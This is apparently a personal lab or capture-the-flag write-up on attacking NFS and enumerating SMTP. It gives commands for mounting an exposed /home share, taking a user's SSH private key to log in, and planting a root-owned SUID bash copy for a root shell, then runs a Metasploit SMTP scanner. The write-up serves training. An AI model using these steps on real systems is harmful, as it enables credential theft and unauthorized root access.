## üõ† 1Ô∏è‚É£ Enumerating Network File System (NFS)  
### üîé **Scanning for Open Ports**  

The first step of enumeration is to conduct a port scan to find out as much information as we can about the services, open ports and operating system of the target machine.

I am going to scan for open ports using an nmap scan.

**Command used:**
```bash
nmap -p- --open <target-IP>
```

**Findings:**

![Screenshot (143)](https://github.com/user-attachments/assets/67458606-c6c6-4c28-9a49-4fb278b6ef65)

1. There are 7 open ports.
2. Port 2049 contains the service we want to enumerate.

Now I used the command below to list the NFS shares

**Command used:**
```bash
/usr/sbin/showmount -e <target-IP>
```

**Findings:**

1. The name of the visible share found is /home.

Now we want to mount the share to our local machine. Firstly, I make create a directory that I will mount my share to using *mkdir /tmp/mount*. My client system needs a directory where all the content shared by the host server in the export folder can be accessed, and we have created this directory, it is called tmp.

I then mounted the NFS share to my local machine.

**Command used:**
```bash
sudo mount -t nfs 10.10.10.71:/home /tmp/mount/ -nolock
```
I then changed directory to where I mounted this share.

**Findings:**

1. The name of the folder inside this directory is cappucino.

I took a look insde this directory and looked at the files. It looks like we are inside a user's home directory.


I did a bit of resesarch inside these folders and found that one folder, *.ssh*, could contain keys that would give us remote access to the server.

Of these keys, the one that is most useful to us is the *id_rsa* one.

I then copied this file to a different location (/root) on my local machine, and changed the permissions to 600.

**Command used:**
```bash
cp id_rsa/root
```
```bash
chmod 600 /root/id_rsa
```
I then listed the contents of the root directory to see if indeed the file was copied there and it was.

I pretty much easily worked out the name of the user this key belongs to because recall how we got to this id_rsa file before. The private key was found in a directory structure like this:

```bash
/tmp/mount/cappucino/.ssh/id_rsa
```
Therefore, the username is the one that comes before /.ssh and that is cappucino.
Thus I logged into the machine using the command below:

```bash
ssh -i id_rsa cappucino@<target-IP>
```
**Findings:**

![Screenshot (152)](https://github.com/user-attachments/assets/8fc6a37d-f692-485a-85b8-bfd226825f53)

I successfully logged into the machine!


## üì§ 3Ô∏è‚É£ Exploiting NFS

To expoit the NFS share, I first have to change directory to the mount point on my machine, and then into the user's home directory. Remember we established that the user's username is cappucino.

![Screenshot (153)](https://github.com/user-attachments/assets/416b021f-38e2-4fb8-aade-8d3091f68011)

We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!
I changed directory to *.ssh* as I was still here because this is where we find the *id_rsa* key.

To download the executable to my Downloads directory, I used the command below:

**Command:**
```bash
scp -i key_name username@10.10.36.95:/bin/bash ~/Downloads/bash
```
I then used the below command to copy the bash executable to the NFS share. During the enumeration stage, we found the NFS share to be /home.
```bash
cp ~/Downloads/bash /home
```
The copied bash shell must be owned by the root user so I set this using:
```bash
sudo chown root /home/bash
```

**Findings:**

Lastly, as the screenshot above shows, I had to verify ownership by listing the contents in the /home/bash directory and indeed the bash shell is owned by a root user.


Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using *sudo chmod +s bash*. And after setting these permissions I used *ls -la /home/bash* to check the permissions of the bash executable. The permissions were successfully set.

## üì° 4Ô∏è‚É£ Enumerating Simple Mail Tranfer Protocol (SMTP)

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network.  We're going to use the "smtp_version" module in MetaSploit to do this.
First, we'll run a port scan to search for open ports.

**Command used:**
```bash
nmap -p- --opne <target-IP>
```

**Findings:**

![Screenshot (209)](https://github.com/user-attachments/assets/cca9b13a-f0f2-4d31-8dc0-dce7a0ea9898)

SMTP is running on port 25.

Now that we know which port we will be targeting, we will start up Metasploit.
**Command used:**
```bash
msfconsole
```
I then searched for the smtp_version using the command below:

```bash
search smtp_version
```

**Findings:**

![Screenshot (210)](https://github.com/user-attachments/assets/fd104917-6e38-4e85-a6a6-45caf5be8371)

The smtp_version's full module name is auxiliary/scanner/smtp/smtp_version

Now, we will select the module and show its options.

**Command used:**

```bash
use auxilliary/scanner/smtp/smtp_version
```
And 

```bash
show options
```

We need to set the RHOSTS option as it is the most important for SMTP enumeration.
I will set it to the correct value of the target machine using the below command. Once set, run using the *run* command.

**Command used:**
```bash
set RHOSTS <taget-IP>
```
**Findings:**

![Screenshot (214)](https://github.com/user-attachments/assets/d5e4238c-4284-4ead-bc57-477a7e365cfb)

The system mail name is polosmtp.home
